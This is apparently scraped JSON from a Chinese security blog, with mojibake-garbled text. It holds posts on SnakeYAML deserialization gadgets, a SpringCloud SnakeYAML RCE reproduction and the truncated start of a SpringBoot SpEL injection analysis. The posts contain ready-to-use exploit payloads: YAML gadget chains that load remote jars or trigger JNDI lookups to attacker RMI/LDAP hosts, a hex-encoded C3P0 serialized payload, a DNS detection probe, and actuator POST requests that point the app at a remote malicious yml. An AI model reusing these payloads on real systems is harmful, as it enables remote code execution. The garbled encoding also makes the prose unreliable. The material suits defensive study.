SnakeYamlæ˜¯ä¸€ä¸ªå®Œæ•´çš„YAML1.1è§„èŒƒProcessorï¼Œæ”¯æŒUTF-8/UTF-16ï¼Œæ”¯æŒJavaå¯¹è±¡çš„åºåˆ—åŒ–/ååºåˆ—åŒ–ï¼Œæ”¯æŒæ‰€æœ‰YAMLå®šä¹‰çš„ç±»å‹ã€‚ å½“ç„¶åœ¨åˆ†æä¹‹å‰è¿˜å¾—äº†è§£YAMLçš„è¯­æ³•æ ¼å¼ï¼Œå…·ä½“å¯ä»¥ç™¾åº¦çœ‹çœ‹ï¼Œè¿™é‡Œä¸æ”¾äº† ä½¿ç”¨SnakeYamlè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–SnakeYamlæä¾›äº†Yaml.dump()å’ŒYaml.load()ä¸¤ä¸ªå‡½æ•°å¯¹yamlæ ¼å¼çš„æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ Yaml.load()ï¼šå…¥å‚æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…ä¸€ä¸ªæ–‡ä»¶ï¼Œç»è¿‡åºåˆ—åŒ–ä¹‹åè¿”å›ä¸€ä¸ªJavaå¯¹è±¡ï¼› Yaml.dump()ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºyamlæ–‡ä»¶å½¢å¼ï¼› Yaml.load()ï¼Œç»è¿‡æˆ‘çš„æµ‹è¯•å½“ä¸å­˜åœ¨æŸä¸ªå±æ€§ï¼Œæˆ–è€…å­˜åœ¨å±æ€§ä½†æ˜¯ä¸æ˜¯ç”±publicä¿®é¥°çš„æ—¶å€™ä¼šè°ƒç”¨setæ–¹æ³•ï¼Œè¿™é‡Œä¸æƒ³æ”¾å›¾äº†è‡ªå·±ç©ç©å§ 123456789101112131415161718192021222324252627282930313233343536373839public class TestBean &#123;// static &#123;// try &#123;// Runtime.getRuntime().exec(&quot;open -na Calculator&quot;);// &#125;catch (Exception e)&#123;//// &#125;// &#125; protected String name; private String test; public String tt; String abc; public TestBean()&#123; System.out.println(&quot;æ„é€ æ–¹æ³•&quot;); &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public void setTest(String test) &#123; System.out.println(&quot;setTest&quot;); this.test = test; &#125; public void setTt(String tt) &#123; System.out.println(&quot;setTt&quot;); this.tt = tt; &#125; public void setAbc(String abc) &#123; System.out.println(&quot;setAbc&quot;); this.abc = abc; &#125;&#125; ä¹‹åè°ƒç”¨ 12Yaml yaml = new Yaml();yaml.load(&quot;!!TestBean &#123;name: abc, test: aa, tt: jj, abc: def&#125;&quot;); è‡³äºä¸ºä»€ä¹ˆPublicä¸èƒ½è°ƒç”¨setæ–¹æ³•ï¼Œç®€å•è¯´ä¸€ä¸‹åœ¨åé¢è°ƒç”¨constructJavaBean2ndStep()å‡½æ•°ï¼Œå…¶ä¸­ä¼šè·å–yamlæ ¼å¼æ•°æ®ä¸­çš„å±æ€§çš„é”®å€¼å¯¹ï¼Œç„¶åè°ƒç”¨propert.set()æ¥è®¾ç½®æ–°å»ºçš„ç›®æ ‡å¯¹è±¡çš„å±æ€§å€¼ï¼Œè€Œè¿™ä¸ªPropertyçš„è®¾ç½®åœ¨org.yaml.snakeyaml.introspector.PropertyUtils#getPropertiesMap å¯ä»¥çœ‹åˆ°è¿™ä¸ªå¦‚æœæ˜¯Publicä¿®é¥°çš„è¯ï¼Œåé¢ä¼šè°ƒç”¨org.yaml.snakeyaml.introspector.FieldProperty#getï¼Œè¿™ä¸ªåªæ˜¯åå°„è·å–å€¼ è€Œå¦‚æœæ˜¯MethodProperty.set()å‡½æ•°ï¼Œåˆ™å°±æ˜¯é€šè¿‡åå°„æœºåˆ¶æ¥è°ƒç”¨ç›®æ ‡ç±»nameå±æ€§çš„setteræ–¹æ³•æ¥è¿›è¡Œå±æ€§å€¼çš„è®¾ç½® SnakeYamlååºåˆ—åŒ–è¿‡ç¨‹è°ƒè¯•åˆ†æå½“ç„¶æ—¢ç„¶SnakeYamlè¿™ä¸ªåº“ä¹Ÿä¸è®¤ä¸ºååºåˆ—åŒ–ä¸€äº›ç±»æ˜¯æ¼æ´é‚£ä¹ˆæˆ‘ä¹Ÿä¸ä¼šå»è¯¦ç»†çš„äº†è§£æ¯ä¸€æ­¥ï¼Œè‡³å°‘æ„Ÿè§‰åšåˆ°çŸ¥é“æœ‰è¿™ä¸ªç±»ä»¥åèƒ½å¤Ÿå¦‚ä½•åˆ©ç”¨äº† åœ¨load()å‡½æ•°ä¸­ä¼šå…ˆç”Ÿæˆä¸€ä¸ªStreamReaderï¼Œå°†yamlæ•°æ®é€šè¿‡æ„é€ å‡½æ•°èµ‹ç»™StreamReaderï¼Œå†è°ƒç”¨loadFromReader()å‡½æ•°ï¼š åœ¨loadFromReader()å‡½æ•°ä¸­ï¼Œè°ƒç”¨äº†BaseConstructor.getSingleData()å‡½æ•°ï¼Œæ­¤æ—¶typeä¸ºjava.lang.Objectï¼ŒæŒ‡å®šä»yamlæ ¼å¼æ•°æ®ä¸­è·å–æ•°æ®ç±»å‹æ˜¯Objectç±»å‹ï¼š è·Ÿè¿›getSingleData()å‡½æ•°ä¸­ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªNodeå¯¹è±¡ï¼ˆå…¶ä¸­è°ƒç”¨getSingleNote()ä¼šæ ¹æ®æµæ¥ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œå³å°†å­—ç¬¦ä¸²æŒ‰ç…§yamlè¯­æ³•è½¬ä¸ºNodeå¯¹è±¡ï¼‰ï¼Œç„¶ååˆ¤æ–­å½“å‰Nodeæ˜¯å¦ä¸ºç©ºä¸”æ˜¯å¦Tagä¸ºç©ºï¼Œè‹¥ä¸æ˜¯åˆ™åˆ¤æ–­yamlæ ¼å¼æ•°æ®çš„ç±»å‹æ˜¯å¦ä¸ºObjectç±»å‹ã€æ˜¯å¦æœ‰æ ¹æ ‡ç­¾ï¼Œè¿™é‡Œéƒ½åˆ¤æ–­ä¸é€šè¿‡ï¼Œæœ€åè¿”å›è°ƒç”¨constructDocument()å‡½æ•°çš„ç»“æœï¼š åœ¨getClassForNode()å‡½æ•°ä¸­ï¼Œå…ˆæ ¹æ®tagå–å‡ºclassNameä¸ºç›®æ ‡ç±»ï¼Œç„¶åè°ƒç”¨getClassForName()å‡½æ•°è·å–åˆ°å…·ä½“çš„ç±»ï¼š è¿˜æœ‰ä¸ªå°ç»†èŠ‚å°±æ˜¯getClassForNameå¯ä»¥åˆå§‹åŒ–é™æ€å—é‡Œé¢çš„å‡½æ•° è°ƒç”¨construct()å‡½æ•°å®ä¾‹åŒ–ç±»å¯¹è±¡ è¿›ä¸€æ­¥è·Ÿè¿›constructJavaBean2ndStep()å‡½æ•°ï¼Œå…¶ä¸­ä¼šè·å–yamlæ ¼å¼æ•°æ®ä¸­çš„å±æ€§çš„é”®å€¼å¯¹ï¼Œç„¶åè°ƒç”¨propert.set()æ¥è®¾ç½®æ–°å»ºçš„ç›®æ ‡å¯¹è±¡çš„å±æ€§å€¼ï¼Œè¿™é‡Œä¸Šé¢å·²ç»æè¿‡äº†ä¹Ÿå°±æ²¡å•¥å¥½è¯´çš„äº†ï¼Œæ•´ä¸ªåˆ©ç”¨é“¾ä¹Ÿæœ‰äº†ï¼Œåˆ†æå®Œæ¯• å¯åˆ©ç”¨çš„Gadget1.åˆ©ç”¨SPIæœºåˆ¶-åŸºäºScriptEngineManageråˆ©ç”¨é“¾1!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1/a.jar&quot;]]]] åˆ©ç”¨æ ˆ 12345678910111213141516171819newInstance:396, Class (java.lang)nextService:380, ServiceLoader$LazyIterator (java.util)next:404, ServiceLoader$LazyIterator (java.util)next:480, ServiceLoader$1 (java.util)initEngines:122, ScriptEngineManager (javax.script)init:84, ScriptEngineManager (javax.script)&lt;init&gt;:75, ScriptEngineManager (javax.script)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:423, Constructor (java.lang.reflect)construct:557, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)construct:341, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObject:182, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:141, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:127, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:450, Yaml (org.yaml.snakeyaml)load:369, Yaml (org.yaml.snakeyaml)main:10, Demo (BasicKnow.SnakeymlUnser) 2.JdbcRowSetImpl1String poc = &quot;!!com.sun.rowset.JdbcRowSetImpl\\n dataSourceName: \\&quot;ldap://localhost:1389/Exploit\\&quot;\\n autoCommit: true&quot;; å½“ç„¶ä¹Ÿå¯ä»¥å†™æˆ 1String poc = &quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;, autoCommit: true&#125;&quot;; æˆ‘ä»¬çŸ¥é“åˆ©ç”¨é“¾æ˜¯setDataSourceName-&gt;setAutoCommitï¼Œ å¯ä»¥çœ‹åˆ°ä¿®é¥°ç¬¦ 1private String dataSource; å› æ­¤å¯ä»¥è§¦å‘ï¼Œä¸å¤šè¯´äº†å¤ªç®€å•äº† 3.Spring PropertyPathFactoryBeanç®€å•æµ‹è¯•ä¸‹èƒ½æ‹¿ä¸‹æ•´ä¸ªç‰ˆæœ¬åˆ°2.6.3æœ€æ–°ç‰ˆéƒ½è¡Œï¼Œä¸è¿‡ä¹Ÿå¾ˆå¥½ç†è§£ 12345String poc = &quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\\n&quot; +&quot; targetBeanName: \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;\\n&quot; +&quot; propertyPath: y4tacker\\n&quot; +&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\\n&quot; +&quot; shareableResources: [\\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;]&quot;; æˆ–è€…ä¸€è¡Œæ‹¿ä¸‹ 1String poc = &quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean &#123;targetBeanName: \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;, propertyPath: \\&quot;y4tacker\\&quot;, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory &#123;shareableResources: [\\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;]&#125;&#125;&quot;; å¯ä»¥çœ‹åˆ°åœ¨org.springframework.beans.factory.config.PropertyPathFactoryBean#setBeanFactory è¿™é‡Œç½‘ä¸Šæµä¼ ç‰ˆæœ¬æ‰¾åˆ°ä¸ªorg.springframework.jndi.support.SimpleJndiBeanFactoryï¼Œå…¶è°ƒç”¨getBeançš„æ—¶å€™ä¼šè§¦å‘JNDIæ³¨å…¥ï¼Œå½“ç„¶è¿™é‡Œè¿˜æœ‰ä¸ªé™åˆ¶æ˜¯this.beanFactory.isSingleton(this.targetBeanName) ä¹Ÿå¾ˆå¥½ç»•è¿‡è®¾ç½®shareableResourceså³å¯ 4.Apache XBeanä¾èµ–ï¼Œå½“ç„¶ç‰ˆæœ¬æ²¡é™åˆ¶ 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt; &lt;artifactId&gt;xbean-naming&lt;/artifactId&gt; &lt;version&gt;4.20&lt;/version&gt;&lt;/dependency&gt; 1String poc = &quot;!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\\&quot;foo\\&quot;,!!javax.naming.Reference [\\&quot;foo\\&quot;, \\&quot;TouchFile\\&quot;, \\&quot;http://yourVps/\\&quot;],!!org.apache.xbean.naming.context.WritableContext []]]&quot;; åŸå› åœ¨äºorg.apache.xbean.naming.context.ContextUtil$ReadOnlyBindingç»§æ‰¿äº†Binding å¦‚æœèƒ½è§¦å‘å…¶toStringå‡½æ•°å³å¯è°ƒç”¨org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding#getObjectï¼Œåœ¨è°ƒç”¨åˆ°org.apache.xbean.naming.context.ContextUtil#resolveæ—¶ çœ‹åˆ°è¿™ä¸ªå°±ä¸é™Œç”Ÿäº†ï¼Œå¤ªç†Ÿæ‚‰äº†ï¼Œç”šè‡³ä¸å…è®¸è¿œç¨‹è°ƒç”¨çš„æ—¶å€™ä¹Ÿèƒ½å°è¯•æ‰¾ObjectFactoryç»•è¿‡ 5.C3P0 JndiRefForwardingDataSourceæ¯”è¾ƒç®€å•æ”¾ä¸ªpocå°±è¡Œäº† 123String poc = &quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\\n&quot; +&quot; jndiName: \\&quot;rmi://localhost/Exploit\\&quot;\\n&quot; +&quot; loginTimeout: 0&quot;; æˆ–è€… 1String poc = &quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource &#123;jndiName: \\&quot;rmi://localhost/Exploit\\&quot;, loginTimeout: \\&quot;0\\&quot;&#125;&quot;; ä¸è¿‡è¿˜æ˜¯ç®€å•è¯´ä¸€ä¸‹ï¼Œcom.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout è°ƒç”¨äº†this.inner()é‡Œé¢åˆè°ƒç”¨äº†this.dereference()ï¼Œæœ€ç»ˆè§¦å‘JNDIæ³¨å…¥ 6.C3P0 WrapperConnectionPoolDataSource123String poc = &quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\n&quot; +&quot; userOverridesAsString: \\&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;\\&quot;&quot;; å¾ˆç®€å•C3P0çš„äºŒæ¬¡ååºåˆ—åŒ–payloadï¼Œä¸å¤šè¯´äº† 7.Apache Commons Configurationå¼•å…¥ä¾èµ–æµ‹è¯• 12345&lt;dependency&gt; &lt;groupId&gt;commons-configuration&lt;/groupId&gt; &lt;artifactId&gt;commons-configuration&lt;/artifactId&gt; &lt;version&gt;1.10&lt;/version&gt;&lt;/dependency&gt; è§¦å‘payloadæ˜¯è¿™ä¸ª 12String poc = &quot;set:\\n&quot; + &quot; ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;]]&quot;; ç½‘ä¸Šæœäº†ä¸€ä¸‹ 1? å·ï¼š é’ˆå¯¹è¾ƒä¸ºå¤æ‚çš„å¯¹è±¡æ ¼å¼ ä½†æ˜¯åœ¨ç†è§£äº†åŸç†ä»¥åæ‰çŸ¥é“ï¼Œæå¤æ‚äº†ï¼Œå®é™…ä¸Šä¸‹é¢è¿™ä¸ªpayloadä¹Ÿå¯ä»¥ 1poc = &quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;]]: 1&quot;; ä¸»è¦æ˜¯è§¦å‘çš„æ—¶å€™æ˜¯åˆ©ç”¨keyè°ƒç”¨hashCodeæ–¹æ³•æ‰€äº§ç”Ÿçš„åˆ©ç”¨é“¾ï¼Œè¿˜æ˜¯ç®€å•è¯´ä¸‹è°ƒç”¨é“¾å§ åœ¨å¯¹ConfigurationMapè°ƒç”¨hashCodeçš„æ—¶å€™å®é™…ä¸Šæ˜¯æ‰§è¡Œäº†,java.util.AbstractMap#hashCode 1234567public int hashCode() &#123; int h = 0; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) h += i.next().hashCode(); return h;&#125; ä¹‹åä¼šè°ƒç”¨org.apache.commons.configuration.ConfigurationMap#entrySetçš„iteratoræ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯org.apache.commons.configuration.ConfigurationMap.ConfigurationSet#iterator ä¹‹åå°±å¯ä»¥é…åˆJNDIConfigurationå®ç°jndiæ³¨å…¥ 1234lookup:417, InitialContext (javax.naming)getBaseContext:452, JNDIConfiguration (org.apache.commons.configuration)getKeys:203, JNDIConfiguration (org.apache.commons.configuration)getKeys:182, JNDIConfiguration (org.apache.commons.configuration) æ¢æµ‹SnakeYAMLçªç„¶æƒ³åˆ°ä¸€ä¸ªæ–°çš„æ¢æµ‹payloadï¼Œä¹‹å‰ä¸Šé¢æœ‰ä¸€ä¸ªSPIé‚£ä¸ªé“¾å­å¯ä»¥æœ‰é€šè¿‡URLClassloaderæ£€æµ‹ 1String poc = &quot;!!java.net.URL [null, \\&quot;[http://osrwbf.dnslog.cn](http://osrwbf.dnslog.cn/)\\&quot;]: 1&quot;; è¿™ä¸ªçš„è¯ä¸»è¦æ˜¯å› ä¸ºSnakeYAMLåœ¨è§£æå¸¦é”®å€¼å¯¹çš„é›†åˆçš„æ—¶å€™ä¼šå¯¹é”®è°ƒç”¨hashCodeæ–¹æ³•å› æ­¤ä¼šè§¦å‘DNSè§£æï¼Œå› æ­¤é€šè¿‡æ„é€ URLå¯¹è±¡åé¢ç®€å•åŠ ä¸ª: 1è®©ä»–æˆä¸ºä¸€ä¸ªmapping","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"SnakeYAML","slug":"SnakeYAML","permalink":"https://y4tacker.github.io/tags/SnakeYAML/"}]},{"title":"SpringCloud-SnakeYAML-RCE","slug":"year/2022/2/SpringCloud-SnakeYAML-RCE","date":"2022-02-08T02:01:51.000Z","updated":"2024-08-04T09:01:49.127Z","comments":true,"path":"2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/","link":"","permalink":"https://y4tacker.github.io/2022/02/08/year/2022/2/SpringCloud-SnakeYAML-RCE/","excerpt":"","text":"SpringCloud-SnakeYAML-RCEåˆ©ç”¨æ¡ä»¶Psï¼šæ”¯æŒ/envçš„postçš„å¥½åƒå¿…é¡»è¦springCloudï¼ŒspringBootæˆ‘æ€ä¹ˆéƒ½ä¸å¯ä»¥æœäº†ç½‘ä¸Šä¸€å †ä¹Ÿä¸è¡Œï¼Œæœ‰å¤§ä½¬çŸ¥é“å¯ä»¥è¯´è¯´ä¸ºä»€ä¹ˆ å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /env æ¥å£è®¾ç½®å±æ€§ å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /refresh æ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨ spring-boot-starter-actuator ä¾èµ–ï¼‰ ç›®æ ‡ä¾èµ–çš„ spring-cloud-starter ç‰ˆæœ¬ &lt; 1.3.0.RELEASE ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„ HTTP æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰ æ¼æ´å¤ç°1.åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ç½®åç¼€ä¸º yml çš„æ–‡ä»¶ example.ymlï¼Œå†…å®¹å¦‚ä¸‹ 12345!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&quot;http://your-vps-ip/example.jar&quot;] ]]] 2.å‡†å¤‡ä¸€ä¸ªæ¶æ„jarï¼Œå®ç°SPIï¼Œå¾ˆç®€å•å¦‚ä¸‹ 3.è®¾ç½® spring.cloud.bootstrap.location å±æ€§ spring1.x 1234POST /envContent-Type: application/x-www-form-urlencodedspring.cloud.bootstrap.location=http://your-vps-ip/example.yml spring2.x 1234POST /actuator/envContent-Type: application/json&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125; 4.åˆ·æ–°é…ç½® spring 1.x 12POST /refreshContent-Type: application/x-www-form-urlencoded spring 2.x 12POST /actuator/refreshContent-Type: application/json æ¼æ´åŸç†ä»è¿‡ç¨‹ä¸­æˆ‘ä»¬çŸ¥é“ï¼Œå‘½ä»¤æ‰§è¡Œæ˜¯ç”±äº SnakeYAML åœ¨è§£æ YAML æ–‡ä»¶æ—¶ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´å¯¼è‡´ï¼Œè¿™ä¸ªåœ¨æˆ‘åšå®¢å…¶ä»–æ–‡ç« å°±æœ‰æè¿‡äº†ï¼Œè¿™é‡Œå°±ä¸å†å¤šè¯´ çœ‹å‡ ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œå¤„ç† /refresh æ¥å£è¯·æ±‚çš„ç±»åœ¨org.springframework.cloud.endpoint.RefreshEndpoint#refresh ç¬¬äºŒä¸ªæ˜¯ BootstrapApplicationListener.bootstrapServiceContext() æ–¹æ³•ï¼Œè¿™é‡Œä»ç¯å¢ƒå˜é‡ä¸­è·å–åˆ°äº† spring.cloud.bootstrap.location çš„å€¼ æœ€ååœ¨ org.springframework.boot.env.PropertySourcesLoader.load() æ–¹æ³•ï¼Œæ ¹æ®æ–‡ä»¶ååç¼€ (yml) ï¼Œä½¿ç”¨ YamlPropertySourceLoader ç±»åŠ è½½ url å¯¹åº”çš„ yml é…ç½®æ–‡ä»¶ï¼Œå›  spring-beans.jar åŒ…å« snakeyaml.jarï¼Œå› æ­¤ YamlPropertySourceLoader åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯ä½¿ç”¨ SnakeYAML åº“è§£æé…ç½® é«˜ç‰ˆæœ¬æ— æ•ˆåœ¨Spring1.xç‰ˆæœ¬å½“ä¸­ 1234567891011121314151617181920212223242526private StandardEnvironment copyEnvironment(ConfigurableEnvironment input) &#123; StandardEnvironment environment = new StandardEnvironment(); MutablePropertySources capturedPropertySources = environment.getPropertySources(); Iterator var4 = capturedPropertySources.iterator(); PropertySource source; while(var4.hasNext()) &#123; source = (PropertySource)var4.next(); capturedPropertySources.remove(source.getName()); &#125; var4 = input.getPropertySources().iterator(); while(var4.hasNext()) &#123; source = (PropertySource)var4.next(); capturedPropertySources.addLast(source); &#125; environment.setActiveProfiles(input.getActiveProfiles()); environment.setDefaultProfiles(input.getDefaultProfiles()); Map&lt;String, Object&gt; map = new HashMap(); map.put(&quot;spring.jmx.enabled&quot;, false); map.put(&quot;spring.main.sources&quot;, &quot;&quot;); capturedPropertySources.addFirst(new MapPropertySource(&quot;refreshArgs&quot;, map)); return environment; &#125; åœ¨Spring2.xç‰ˆæœ¬å½“ä¸­ï¼Œå´æœ‰é™åˆ¶ 1234567891011121314151617181920212223242526private StandardEnvironment copyEnvironment(ConfigurableEnvironment input) &#123; StandardEnvironment environment = new StandardEnvironment(); MutablePropertySources capturedPropertySources = environment.getPropertySources(); String[] var4 = DEFAULT_PROPERTY_SOURCES; int var5 = var4.length; for(int var6 = 0; var6 &lt; var5; ++var6) &#123; String name = var4[var6]; if (input.getPropertySources().contains(name)) &#123; if (capturedPropertySources.contains(name)) &#123; capturedPropertySources.replace(name, input.getPropertySources().get(name)); &#125; else &#123; capturedPropertySources.addLast(input.getPropertySources().get(name)); &#125; &#125; &#125; environment.setActiveProfiles(input.getActiveProfiles()); environment.setDefaultProfiles(input.getDefaultProfiles()); Map&lt;String, Object&gt; map = new HashMap(); map.put(&quot;spring.jmx.enabled&quot;, false); map.put(&quot;spring.main.sources&quot;, &quot;&quot;); map.put(&quot;spring.main.web-application-type&quot;, &quot;NONE&quot;); capturedPropertySources.addFirst(new MapPropertySource(&quot;refreshArgs&quot;, map)); return environment; &#125; å¿…é¡»åœ¨DEFAULT_PROPERTY_SOURCESå½“ä¸­çš„æ‰èƒ½è¢«æ·»åŠ åˆ°propertySourceListï¼Œè€Œæ°å¥½ 1private static final String[] DEFAULT_PROPERTY_SOURCES = new String[]&#123;&quot;commandLineArgs&quot;, &quot;defaultProperties&quot;&#125;; ç»“è®º Spring Boot 2.x æ— æ³•åˆ©ç”¨æˆåŠŸ Spring Boot 1.5.x åœ¨ä½¿ç”¨ Dalston ç‰ˆæœ¬æ—¶å¯åˆ©ç”¨æˆåŠŸï¼Œä½¿ç”¨ Edgware æ— æ³•æˆåŠŸ Spring Boot &lt;= 1.4 å¯åˆ©ç”¨æˆåŠŸ","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"SnakeYAML","slug":"SnakeYAML","permalink":"https://y4tacker.github.io/tags/SnakeYAML/"}]},{"title":"ä½ç‰ˆæœ¬SpringBoot-SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¤ç°åˆ†æ","slug":"year/2022/2/ä½ç‰ˆæœ¬SpringBoot-SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¤ç°åˆ†æ","date":"2022-02-07T08:19:51.000Z","updated":"2024-08-04T09:01:49.175Z","comments":true,"path":"2022/02/07/year/2022/2/ä½ç‰ˆæœ¬SpringBoot-SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¤ç°åˆ†æ/","link":"","permalink":"https://y4tacker.github.io/2022/02/07/year/2022/2/%E4%BD%8E%E7%89%88%E6%9C%ACSpringBoot-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/","excerpt":"","text":"ä½ç‰ˆæœ¬SpringBoot-SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¤ç°åˆ†æå½±å“ç‰ˆæœ¬SpringBoot 1.1.0-1.1.12SpringBoot 1.2.0-1.2.7SpringBoot 1.3.0 åˆ©ç”¨æ¡ä»¶æ˜¯ä½¿ç”¨äº†springbootçš„é»˜è®¤é”™è¯¯é¡µ(Whitelabel Error Page)ï¼Œæ¼æ´ç‚¹åœ¨ï¼šorg.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration è§¦å‘åŸå› åœ¨SpringBootçš„è‡ªå®šä¹‰é”™è¯¯é¡µé¢ï¼ŒåŠŸèƒ½æ˜¯é¡µé¢è¿”å›é”™è¯¯ï¼Œå¹¶æä¾›è¯¦ç»†ä¿¡æ¯ï¼Œä¿¡æ¯ä¸­åŒ…æ‹¬é”™è¯¯statusï¼ˆâ€statusâ€-&gt;500ï¼‰ã€æ—¶é—´æˆ³ï¼ˆâ€timestampâ€-&gt;â€Fri Decâ€¦..â€ï¼‰ã€é”™è¯¯ä¿¡æ¯ï¼ˆâ€errorâ€-&gt;â€Internal Server Errorâ€ï¼‰ã€å’Œç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼ˆâ€messageâ€-&gt;â€abcdâ€ï¼‰ï¼Œè¿™äº›å‚æ•°åœ¨æ¨¡æ¿æ–‡ä»¶ä¸­ä»¥ç±»ä¼¼äºä»¥ä¸‹å½¢å¼å­˜åœ¨ï¼šâ€Error 1234 ${status}â€”${timestamp}â€”${error}â€”${message}â€œã€‚ å…³äºæ¼æ´çš„åŸç†ï¼š spring boot å¤„ç†å‚æ•°å€¼å‡ºé”™ï¼Œæµç¨‹è¿›å…¥ org.springframework.util.PropertyPlaceholderHelper ç±»ä¸­ æ­¤æ—¶ URL ä¸­çš„å‚æ•°å€¼ä¼šç”¨ parseStringValue æ–¹æ³•è¿›è¡Œé€’å½’è§£æ å…¶ä¸­ $&#123;&#125; åŒ…å›´çš„å†…å®¹éƒ½ä¼šè¢« org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration ç±»çš„ resolvePlaceholder æ–¹æ³•å½“ä½œ SpEL è¡¨è¾¾å¼è¢«è§£ææ‰§è¡Œï¼Œé€ æˆ RCE æ¼æ´ ä½†ä¸»è¦çš„åŸå› 